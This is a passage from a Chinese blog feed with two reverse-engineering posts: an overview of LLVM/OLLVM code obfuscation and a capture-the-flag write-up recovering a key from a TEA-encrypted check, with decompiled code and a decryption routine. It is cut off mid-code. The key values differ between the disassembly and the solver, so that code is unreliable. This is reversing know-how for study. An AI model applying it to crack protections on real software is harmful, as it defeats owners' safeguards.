          
          <category> 逆向 </category>
          
          <category> 工具 </category>
          
          <category> 符号执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 概念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ollvm代码混淆</title>
      <link href="/posts/f1101757.html"/>
      <url>/posts/f1101757.html</url>
      
        <content type="html"><![CDATA[<h1>编译器</h1><h2 id="概念">概念</h2><p><code>将高级语言编写的程序转换位目标语言(通常是机器语言)的程序叫做编译器.</code>这个转换的过程叫编译.不同于在执行解释性语言解释器总存在且逐行解释,编译器一次性把整个程序编译成二进制代码从而一般情况运行更快.但是由于解释器可以在不同平台上运作,兼容性,跨平台性更强.</p><h2 id="编译器构成">编译器构成</h2><p>传统的编译器构成常分为三个部分:前端,优化器,后端.编译过程中,前端负责语法分析,将源代码转为其高级形式:抽象语法树(即把源代码的字符串转为内存中有意义的数据);优化器将经过前端处理的中间代码进行优化;后端将优化后的中间代码转换为对应的汇编语言.</p><h2 id="主要编译器">主要编译器</h2><h3 id="GCC">GCC</h3><blockquote><p>GCC（GNU Compiler Collection，GNU 编译器套装），是一套由 GNU 开发的编程语言编译器。GCC 原名为 GNU C 语言编译器，因为它原本只能处理 C语言。GCC 快速演进，变得可处理 C++、Fortran、Pascal、Objective-C、Java 以及 Ada 等他语言。</p></blockquote><h3 id="LLVM">LLVM</h3><blockquote><p>LLVM （Low Level Virtual Machine，底层虚拟机)）提供了与编译器相关的支持，能够进行程序语言的编译期优化、链接优化、在线编译优化、代码生成。简而言之，可以作为多种编译器的后台来使用。</p><p>苹果公司一直使用 GCC 作为官方的编译器。GCC 作为一款开源的编译器，一直做得不错，但 Apple 对编译工具会提出更高的要求。原因主要有以下两点：</p><p>其一，是 Apple 对 Objective-C 语言（包括后来对 C 语言）新增很多特性，但 GCC 开发者并不买 Apple 的账——不给实现，因此索性后来两者分成两条分支分别开发，这也造成 Apple 的编译器版本远落后于 GCC 的官方版本。</p><p>其二，GCC 的代码耦合度太高，很难独立，而且越是后期的版本，代码质量越差，但 Apple 想做的很多功能（比如更好的 IDE 支持），需要模块化的方式来调用 GCC，但 GCC一直不给做。</p></blockquote><p>该编译器的特殊点在于中间表示(IR).这是前端将源代码生成为一种类机器码(各平台不同),并可以由LLVM后端解析的代码.用以扩展解释器的跨平台性.此前,一般是把源代码编译成C代码然后交由对应平台的C编译器编译成二进制文件(因为一般平台都有C编译器).在LLVM中,只需要把源文件编译成IR然后交由LLVM后端直接编译到对应平台.</p><h3 id="CLANG">CLANG</h3><p>Clang 是 LLVM 的前端,于LLVM的后端组合可以当作另一个编译器,Clang是Apple研发的前端旨在代替GCC的前端</p><hr><h1>OLLVM</h1><p>在LLVM基础上,Obfuscator-LLVM项目被研发了出来,通过三种混淆Pass(模块)完善代码的安全性.</p><ul><li>控制流平坦化</li><li>指令替换</li><li>伪造控制流(又叫混淆控制流)</li></ul><p>混淆Pass作用于IR,通过混淆IR使后端转换的文件被混淆,使逆向难度增大.</p><h2 id="控制流平坦化">控制流平坦化</h2><p><img src="https://s2.loli.net/2023/12/21/RahxKGqA8B5OnCr.png" alt="104308x4cppkp5zjsfl8zy"></p><p>代码本身是真实块和retn块的组合,在进行控制流平坦化之后,程序的流程被分发器控制,所有真实块最后进行对标记的处理然后全部进入预处理器,根据标记的值不同由主分发器分发到副分发器再到真实块,从而混淆了整个执行流程,在反汇编视图中的特征是有很多while循环在后面有switch case语句.(以我的水平来看,控制流平坦化之后几乎不可读)</p><h3 id="特征">特征</h3><p>原始的条件一般会转化为CMOV条件传送指令,根据比较结果设置标记的值</p><h2 id="指令替换">指令替换</h2><p>用多个表达式替换一个计算表达式</p><h3 id="特征-2">特征</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">原式子：</span><br><span class="line">a=b+c</span><br><span class="line">混淆后：</span><br><span class="line">a = b - (-c)</span><br><span class="line">a = -(-b + (-c))</span><br><span class="line">r = rand (); a = b + r; a = a + c; a = a - r</span><br><span class="line">r = rand (); a = b - r; a = a + b; a = a + r</span><br><span class="line"></span><br><span class="line">原式子：</span><br><span class="line">a = b-c</span><br><span class="line">混淆后：</span><br><span class="line">a = b + (-c)</span><br><span class="line">r = rand (); a = b + r; a = a - c; a = a - r</span><br><span class="line">r = rand (); a = b - r; a = a - c; a = a + r</span><br><span class="line"></span><br><span class="line">原指令：</span><br><span class="line">a = b &amp; c</span><br><span class="line">混淆后：</span><br><span class="line">a = (b ^ ~c) &amp; b</span><br><span class="line">a = ~(~a | ~b) &amp; (r | ~r)</span><br><span class="line"></span><br><span class="line">原指令：</span><br><span class="line">a = b | c</span><br><span class="line">混淆后：</span><br><span class="line">a = (b &amp; c) | (b ^ c)</span><br><span class="line">a = (((~a &amp; r) | (a &amp; ~r)) ^ ((~b &amp; r) | (b &amp; ~r))) | (~(~a | ~b) &amp; (r | ~r))</span><br><span class="line"></span><br><span class="line">原指令：</span><br><span class="line">a = a ^ b</span><br><span class="line">混淆后：</span><br><span class="line">a = (~a &amp; b) | (a &amp; ~b)</span><br><span class="line">a = ((~a &amp; r) | (a &amp; ~r)) ^ ((~b &amp; r) | (b &amp; ~r))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者</p><img src="https://ask.qcloudimg.com/http-save/yehe-8150619/9571bfa62d17b52593dff42fa4bd9a47.png" alt="[IDA F5 增强插件，还我源代码（一）-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1845335)" /><h2 id="伪造控制流">伪造控制流</h2><p>伪造控制流是在一开始设置一个变量/表达式,这个变量/表达式被称为<code>不透明谓词</code>,并为每一个基本块生成一个垃圾指令块,通过不透明谓词进行跳转到不同位置,但是实际上不会到达垃圾指令块处.</p><h3 id="特征图">特征图</h3><img src="http://image.3001.net/images/20170323/14902545615701.png!small" alt="6.png" style="zoom:67%;" /><hr><h2 id="对于初学者的逆向方法">对于初学者的逆向方法</h2><p>伪造控制流:见<a href="https://zhuanlan.zhihu.com/p/151853593">Hex-Rays: 十步杀一人，两步秒OLLVM-BCF(zhihu.com)</a></p><p>控制流平坦化和伪造控制流:见<a href="https://github.com/pcy190/deflat">pcy190/deflat: Use angr to deflat the flat control flow. (github.com)</a></p><p>指令替换:见<a href="https://github.com/joydo/d810">joydo/d810 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 反静态分析 </category>
          
          <category> 代码混淆 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 编译器 </tag>
            
            <tag> 混淆 </tag>
            
            <tag> 反混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一道题</title>
      <link href="/posts/2480ed19.html"/>
      <url>/posts/2480ed19.html</url>
      
        <content type="html"><![CDATA[<div class="note info flat"><p>info 本篇是为了复现了当时做题的步骤总结经验，所以会写的比较详细。如果您水平较高，只想看知识点可以直接跳到后面防止被气到脑溢血。同时本篇内容有错误的地方也请在评论区指出,感谢</p></div><details class="folding-tag" green><summary> 不重要的前言 </summary>              <div class='content'>              <p>这是我第一次参加强网杯，但是一道题都没做出来，看来还是要继续学习啊！两天啊两天，我一开始以为我可以解出来，但是失败了。后来经过询问和思考终于知道错在哪里了，所以写一篇记录一下解题过程和知识点。</p>              </div>            </details><p>那么开始吧！</p><h2 id="查看文件信息">查看文件信息</h2><p><img src="https://s2.loli.net/2023/12/18/X9RCPSe2fQFygKq.png" alt="image-20231218091226849"></p><p>这一步是使用工具对文件头部进行分析，找出该文件的基本文件类型，为后面的反编译分析提供便利。</p><p>根据DIE的信息：</p><ol><li>普通64位PE文件</li><li>C或C++</li><li>没有加壳</li><li>注意在节区一行，有TLS字样是亮的，说明有TLS节(当时没注意)</li></ol><hr><h2 id="打开文件获取明显信息">打开文件获取明显信息</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恭喜你进入了主函数里</span><br><span class="line">Please input your key:</span><br><span class="line"><span class="comment">//输入任意内容后自动退出</span></span><br></pre></td></tr></table></figure><p>这一步帮助我们定位关键代码</p><hr><h2 id="反编译器编译查看源代码">反编译器编译查看源代码</h2><details class="folding-tag" ><summary> 化简后的主函数代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  _DWORD Q[<span class="number">15</span>]; <span class="comment">// [rsp+28h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">34</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode((__int64)&amp;byte_7FF71EE840F4, (__int64)argv);</span><br><span class="line">  sub_7FF71EE711A9(byte_7FF71EE7AD78);</span><br><span class="line">  sub_7FF71EE7123F((__int64)aPleaseInputYou);</span><br><span class="line">  <span class="built_in">std</span>::istream::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, flag, <span class="number">33</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( j_strlen(flag) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(Q, <span class="number">0</span>, <span class="number">0x20</span>ui64);</span><br><span class="line">    bToD(Q, flag);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">      TEA(&amp;Q[<span class="number">2</span> * j], &amp;Q[<span class="number">2</span> * j + <span class="number">1</span>]);</span><br><span class="line">    dToB(Q, last);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="type">int</span>)k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( check[k] != last[k] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_7FF71EE7123F((__int64)aNoNoNo);</span><br><span class="line">        sub_7FF71EE711A9(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_7FF71EE7123F((__int64)aYes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF71EE711A9(<span class="string">&quot;Wrong Length!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><p>大致分为三个阶段：</p><ol><li>读入flag</li><li>校验flag</li><li>输出</li></ol><div class="tabs" id="main函数分析"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#main函数分析-1">读入flag</button></li><li class="tab"><button type="button" data-href="#main函数分析-2">校验flag</button></li><li class="tab"><button type="button" data-href="#main函数分析-3">输出</button></li><li class="tab"><button type="button" data-href="#main函数分析-4">其它</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="main函数分析-1"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF71EE711A9(byte_7FF71EE7AD78);</span><br><span class="line">sub_7FF71EE7123F((__int64)aPleaseInputYou);</span><br><span class="line"><span class="built_in">std</span>::istream::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, flag, <span class="number">33</span>i64);</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="main函数分析-2"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( j_strlen(flag) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(Q, <span class="number">0</span>, <span class="number">0x20</span>ui64);</span><br><span class="line">    bToD(Q, flag);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">      TEA(&amp;Q[<span class="number">2</span> * j], &amp;Q[<span class="number">2</span> * j + <span class="number">1</span>]);</span><br><span class="line">    dToB(Q, last);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( check[k] != last[k] )</span><br><span class="line">      &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="main函数分析-3"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF71EE7123F((__int64)aNoNoNo);</span><br><span class="line">sub_7FF71EE711A9(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    sub_7FF71EE7123F((__int64)aYes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF71EE711A9(<span class="string">&quot;Wrong Length!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="main函数分析-4"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v3 = &amp;v5;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">34</span>i64; i; --i )</span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)v3 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">  v3 += <span class="number">4</span>;</span><br><span class="line">&#125;<span class="comment">//看起来没有意义，在一开始初始化内存</span></span><br><span class="line">j___CheckForDebuggerJustMyCode((__int64)&amp;byte_7FF71EE840F4, (__int64)argv);<span class="comment">//看名字是反调试</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><hr><p>读入和输出部分没什么好分析的，主要是检验flag部分，但是先试试可不可以调试，尝试之后果然不可以。那么开始分析检验flag部分：</p><div class="tabs" id="校验部分--1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#校验部分--1-1">长度检验</button></li><li class="tab"><button type="button" data-href="#校验部分--1-2">bToD函数</button></li><li class="tab"><button type="button" data-href="#校验部分--1-3">TEA函数</button></li><li class="tab"><button type="button" data-href="#校验部分--1-4">dToB函数</button></li><li class="tab"><button type="button" data-href="#校验部分--1-5">最终值检定</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="校验部分--1-1"><p>根据<wavy>if ( j_strlen(flag) == 32 )</wavy></p><p>flag为32位</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="校验部分--1-2"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">bToD</span><span class="params">(_DWORD *Q, <span class="type">char</span> *flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> a; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF71EE840F4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">      a |= flag[<span class="number">4</span> * i + j] &lt;&lt; (<span class="number">8</span> * j);</span><br><span class="line">    Q[i] = a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到flag[4 * i + j]，立即想到把flag看作二维数组，一共8行一行4个元素，由于Q是DWORD型，flag是char型，让a异或等于一行flag(第i个要flag左移8i位)相当于让a等于一行flag反向排列组合的十六进制字符,那么Q也会变成8个元素刚好每个32位</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="校验部分--1-3"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">  TEA(&amp;Q[<span class="number">2</span> * j], &amp;Q[<span class="number">2</span> * j + <span class="number">1</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">TEA</span><span class="params">(_DWORD *Q2j_, _DWORD *Q2j1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> det; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF71EE840F4);</span><br><span class="line">  det = <span class="number">0x90508D47</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      *Q2j_ += (((<span class="number">32</span> * *Q2j1) ^ (*Q2j1 &gt;&gt; <span class="number">4</span>)) + *Q2j1) ^ (det + tt[det &amp; <span class="number">3</span>]) ^ det;</span><br><span class="line">      *Q2j1 += (((<span class="number">32</span> * *Q2j_) ^ (*Q2j_ &gt;&gt; <span class="number">4</span>)) + *Q2j_) ^ (det + tt[(det &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">      det -= <span class="number">0x77BF7F99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tt数组的值是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt              db 31h, 0B7h, 0B6h, 31h, 4 dup(0)</span><br></pre></td></tr></table></figure><p>这个函数是典型的TEA加密,它是分组加密,且使用异或,每一步都可逆,写出逆向代码就是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x90508D47</span>;</span><br><span class="line">    <span class="type">int</span> tt[<span class="number">8</span>] = &#123; <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            e -= <span class="number">0x77BF7F99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                e += <span class="number">0x77BF7F99</span>;</span><br><span class="line">                b2 -= (((b1 * <span class="number">32</span>) ^ (b1 &gt;&gt; <span class="number">4</span>)) + b1) ^ (e + tt[(e &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">                b1 -= (((<span class="number">32</span> * b2) ^ (b2 &gt;&gt; <span class="number">4</span>)) + b2) ^ (e + tt[e &amp; <span class="number">3</span>]) ^ e;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>TEA基本解决步骤就是恢复det状态,相等循环长度,内容反向排列,加变减,减变加,异或不变</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="校验部分--1-4"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">dtob</span><span class="params">(_DWORD *Q, <span class="type">char</span> *last)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p_spec; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> spec; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> max; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> b[<span class="number">11</span>]; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+74h] [rbp+54h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> a; <span class="comment">// [rsp+94h] [rbp+74h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+B4h] [rbp+94h]</span></span><br><span class="line"></span><br><span class="line">  p_spec = &amp;spec;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">46</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)p_spec = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    p_spec += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode((__int64)&amp;byte_7FF71EE840F4, (__int64)last);</span><br><span class="line">  b[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  b[<span class="number">1</span>] = <span class="number">8</span>;</span><br><span class="line">  b[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">  b[<span class="number">3</span>] = <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    a = Q[j];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">      last[<span class="number">4</span> * j + k] = a &gt;&gt; b[k];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数把Qj右移的结果赋给last,把last看成二维char数组,所以根据bk的值右移相当于每行逆向排序last</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="校验部分--1-5"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 